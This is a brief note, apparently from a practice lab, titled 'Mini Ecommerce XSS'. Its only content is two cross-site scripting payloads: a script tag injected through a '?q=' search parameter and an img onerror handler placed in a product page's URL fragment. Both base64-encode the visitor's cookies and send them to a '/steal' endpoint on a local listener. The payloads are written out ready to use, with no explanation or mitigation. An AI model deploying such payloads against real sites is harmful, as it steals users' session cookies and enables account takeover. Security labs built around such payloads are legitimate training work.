# Mini Ecommerce XSS

## Attack 


?q=<script>fetch('http://127.0.0.1:5000/steal?cookie='%2Bbtoa(document.cookie))</script>


http://localhost:8000/product/1/#<img src="" onerror="fetch('http://127.0.0.1:5000/steal?cookie='%2Bbtoa(document.cookie))">
